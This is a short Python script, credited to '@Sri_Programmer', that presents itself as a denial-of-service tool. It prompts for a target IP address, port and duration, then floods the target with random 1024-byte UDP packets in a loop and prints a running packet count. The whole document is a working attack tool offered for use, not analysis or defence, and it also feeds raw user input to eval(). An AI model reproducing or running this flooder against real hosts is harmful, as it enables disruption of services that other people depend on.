# Denial Of Service Tool in Python
# done by @Sri_Programmer.
# python v3.7.2

# imports

import os
import platform
import socket
import random
import time

class DenialOfService:

    def __init__(self):
        # For windows Operating system
        if platform.system() == 'windows':
            os.system('cls')
        else:   # For Linux and other operating systems
            os.system('clear')
        
        self.attack()

    def attack(self):

        # creating socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # creating the random bytes to send the data
        bytes = random._urandom(1024)
        target_ip = input('Enter your target ip:')
        target_port = eval(input('Enter your port number:'))
        target_duration = eval(input('Enter your time:'))

        timeoutValue = time.time() + target_duration

        sent_packets = 0

        while True:

            try:
                if time.time() > timeoutValue:
                    break

                sock.sendto(bytes, (target_ip,target_port))
                sent_packets += 1
                print('sent {} packets to {} through port {}'.format(sent_packets,target_ip,target_port))

            except KeyboardInterrupt:
                quit()
            
            except Exception:
                print('Something went wrong...!')
                quit()
    

DenialOfService()